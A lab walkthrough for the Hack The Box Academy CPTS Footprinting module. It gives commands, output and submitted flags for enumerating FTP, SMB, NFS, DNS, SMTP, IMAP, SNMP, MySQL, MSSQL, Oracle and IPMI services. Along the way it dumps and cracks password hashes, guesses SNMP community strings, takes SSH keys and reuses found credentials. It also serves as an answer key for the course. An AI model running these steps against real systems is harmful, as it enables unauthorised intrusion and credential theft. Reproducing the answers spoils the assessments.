---
title: CPTS labs - 03 Footprinting
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 03 Footprinting

## [Footprinting](https://academy.hackthebox.com/module/details/112)

### Host Based Enumeration

#### FTP

**Which version of the FTP server is running on the target system? Submit the entire banner as the answer.**

```
nc -nv $ip 21
```

Results: InFreight FTP v1.1


Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.

```
ftp $ip
```

Enter user anonymous.

Enter password anonymous.

```
ftp> dir
ftp> get flag.txt
ftp> quit

cat flag.
```

Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}


#### SMB

**What version of the SMB server is running on the target system? Submit the entire banner as the answer.**

```
sudo nmap $ip  -p445 -sV -A -sC
```

Results: Samba smbd 4.6.2


 **What is the name of the accessible share on the target?**

```
 smbclient  -L //$ip 
```

Results: sambashare


**Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.**

```
smbclient  //$ip/sambashare -U ""
dir
cd contents
ls
get flag.txt
quit
cat flag.txt
```

Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}


**Find out which domain the server belongs to.**

```
rpcclient -U "" $ip
rpcclient $> querydominfo
```

Results: DEVOPS

**Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.**

```
rpcclient $> netsharegetinfo sambashare
```

Results: InFreight SMB v3.1



**What is the full system path of that specific share? (format: "/directory/names")**

```
rpcclient $> netsharegetinfo sambashare
```

Results: /home/sambauser


#### NFS

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.**

```
sudo nmap $ip -p111,2049 -sV -sC
showmount -e $ip 
mkdir target 
sudo mount -t nfs $ip:/ ./target -o nolock
cd target 
tree .
cat var/nfs/flag.txt 
```

Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.**

```
cat mnt/nfsshare/flag.txt 
```

Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}


#### DNS

**Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**


```
dig any inlanefreight.htb @$ip
```

Result:  ns.inlanefreight.htb



**Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))**

```
#First, we do an initial transfer zone
dig axfr inlanefreight.htb @$ip
```

Results:

```

; <<>> DiG 9.19.21-1-Debian <<>> axfr inlanefreight.htb @10.129.218.112
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
dev.inlanefreight.htb.	604800	IN	A	10.12.0.1
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
;; WHEN: Wed Jul 31 13:57:45 EDT 2024
;; XFR size: 11 records (messages 1, bytes 560)

```


 With the result, now we can do a second transfer zone

```
dig axfr internal.inlanefreight.htb @$ip
```


Results:

```
; <<>> DiG 9.19.21-1-Debian <<>> axfr internal.inlanefreight.htb @10.129.218.112
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
;; WHEN: Wed Jul 31 13:58:29 EDT 2024
;; XFR size: 15 records (messages 1, bytes 677)
```

Then: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}


**What is the IPv4 address of the hostname DC1?**

Get the answer from the response to the previous question. In this case: 10.129.34.16


What is the FQDN of the host where the last octet ends with "x.x.x.203"?

```
dnsenum --dnsserver 10.129.218.112 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
```

Results:

```
-----   dev.inlanefreight.htb   -----


Host's addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.

Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:
__________________________________________________________________________

dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203

```

Therefore: win2k.dev.inlanefreight.htb

#### SMTP

**Enumerate the SMTP service and submit the banner, including its version as the answer.**

```
sudo nmap $ip -sC -sV -p25
```


Results: InFreight ESMTP v2.11


**Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.**

```
for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done
```

Results: robin


#### IMAP / POP3

**Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.**

```
sudo nmap $ip -sV -p110,143,993,995 -sC
```

Results: InlaneFreight Ltd

**What is the FQDN that the IMAP and POP3 servers are assigned to?**

```
sudo nmap $ip -sV -p110,143,993,995 -sC
```

Results: dev.inlanefreight.htb


**Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})**

```
echo $ip inlanefreight.htb dev.inlanefreight.htb >> /etc/hosts
curl -k 'imaps://dev.inlanefreight.htb' --user robin:robin -v
```

```
* Host dev.inlanefreight.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.129.42.195
*   Trying 10.129.42.195:993...
* Connected to dev.inlanefreight.htb (10.129.42.195) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* Server certificate:
*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  start date: Nov  8 23:10:05 2021 GMT
*  expire date: Aug 23 23:10:05 2295 GMT
*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV
< * LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
< * LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.009 + 0.000 + 0.008 secs).
* Connection #0 to host dev.inlanefreight.htb left intact

```

Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}

**What is the customized version of the POP3 server?**

```
openssl s_client -connect $ip:pop3s
```

Results: InFreight POP3 v9.188


**What is the admin email address?**

```
# Establish a imap connection
openssl s_client -connect $ip:imaps

# Login as user robin with password robin
a LOGIN robin robin

# List inboxes
a LIST "" *

# Select one of them
a SELECT DEV.DEPARTMENT.INT

# Retrieves the messages by ID
a FETCH 1 all

```

Results: devadmin@inlanefreight.htb


 **Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})**

```
# Establish a imap connection
openssl s_client -connect $ip:imaps

# Login as user robin with password robin
a LOGIN robin robin

# List inboxes
a LIST "" *

# Select one of them
a SELECT DEV.DEPARTMENT.INT

# Retrieve the messages by ID
a FETCH 1 all

# Retrieve the content of the message with id 1
a FETCH 1 BODY.PEEK[TEXT]
```

Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}

#### SNMP

**Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.**

```
snmpwalk -v2c -c public $ip
```

Results: devadmin@inlanefreight.htb

**What is the customized version of the SNMP server?**

```
snmpwalk -v2c -c public $ip
```

Results: InFreight SNMP v0.91


 **Enumerate the custom script that is running on the system and submit its output as the answer.**

```
snmpwalk -v2c -c public $ip
```

Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}

#### MySQL


**Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)**

```
sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn
```

Results: MySQL 8.0.27


**During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?**

```
mysql -u robin -probin -h $ip
select * from customers.myTable where name LIKE "Otto Lang";
```


Results: ultrices@google.htb

#### MSSQL

**Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.**

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
```

Results: ILF-SQL-01


**Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.**

```
mssqlclient.py backdoor@$ip -windows-auth -p 1433

SELECT name FROM master.dbo.sysdatabases

```

Results: Employees

#### Oracle TNS

Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

```
python3 ./odat.py all -s $ip
# With this we obtain the creds scott/tiger

# Now we connect to the database
sqlplus scott/tiger@$ip/XE as sysdba

# Extract Password Hashes
select name, password from sys.user$;
```

Results: E066D214D5421CCC

#### IPMI

**What username is configured for accessing the host via IPMI?**

```
sudo msfdb init
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
setg RHOSTS $ip
run
```

Results: admin

**What is the account's cleartext password?**

```
sudo msfdb init
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Results: trinity


### Skills assessment

#### Footprinting Lab - Easy

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum. The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

**Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.**

```
ftp $ip -p 2121
# enter user `ceil` and password `qwer1234`

ls -la
cd .ssh
get id_rsa ~/.ssh/
quit

chmod 600 ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa ceil@$ip
find / -name flag.txt 2>/dev/null
cat /home/flag/flag.txt
```

Results:  HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}


#### Footprinting Lab - Medium

This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.**

```
sudo nmap -sS -sV -top-ports 4000 $ip

# We will attack firts service 2049
showmount -e $ip
mkdir target-NFS
sudo mount -t nfs $ip:/ ./target-NFS/ -o nolock
cd target-NFS

sudo ls -la
sudo ls -la TechSupport
sudo cat TechSupport/ticket4238791283782.txt
```

Credentials are obtained for accessing a different service:

```
 5    user="alex"
 6    password="lol123!mD"
```


```
# Now we connect to 3389 RDP:
xfreerdp /cert:ignore /u:alex /p:"lol123\!mD" /v:$ip
```

A Windows connection opens up.

We browse the machine and find `C:\Users\alex\devshare\important` file, that contains the following creds:

```
sa:87N1ns@slls83
```

Right click on Microsoft SQL Server Management Studio and select "Execute as Administrator". Enter the creds `87N1ns@slls83`. Now we connect to the server:

![sql](img/htb-academy-footprinting-module_00.png) 

Browse around, but the final SQL query would be

```MSSQL
SELECT TOP (1000) [id]
      ,[name]
      ,[password]
  FROM [accounts].[dbo].[devsacc]
```

Results: lnch7ehrdn43i7AoqVPK4zWR

#### Footprinting Lab - Hard

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.**

```
# Enumerate TCP and UDP
sudo nmap -sS -sV -top-ports 4000 $ip
sudo nmap $ip -sU   
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

We start with SNMP vulnerabilities:

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
```

In the result, you can spot the `community string` `backup`. Now, we can use braa:

```
braa backup@$ip:.1.3.6.* 
```

In the results a credential is showed:

```
tom NMds732Js2761
```

We use that credential to login into the IMAP server:

```
openssl s_client -connect $ip:imaps

a LOGIN tom NMds732Js2761

a SELECT INBOX
a FETCH 1 all
a FETCH 1 BODY.PEEK[TEXT]
```

And we obtain a OPENSSH PRIVATE KEY that we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.

```
chmod 600 id_rsa
ssh tom@$ip
```

Now, we are in. I had a look at the history file and saw a MySQL connection:

```
history
```

I decided to have a look at it:

```
mysql -u tom -p

#Enter the password NMds732Js2761
```

```
show databases;
use users;
show tables;
select * from users;
```


Results: cr3n4o7rzse7rzhnckhssncif7ds
